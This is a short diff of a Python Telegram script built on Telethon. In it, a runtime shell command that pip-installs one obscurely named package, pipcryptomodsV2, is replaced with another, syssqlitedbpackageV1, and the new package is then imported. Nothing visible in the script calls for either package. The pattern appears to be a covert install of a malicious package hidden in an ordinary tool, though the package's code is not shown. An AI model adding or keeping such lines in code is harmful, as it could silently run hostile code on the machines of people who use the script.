@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptomodsV2")
-import pipcryptomodsV2
+os.system("pip install syssqlitedbpackageV1")
+import syssqlitedbpackageV1
 import requests
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
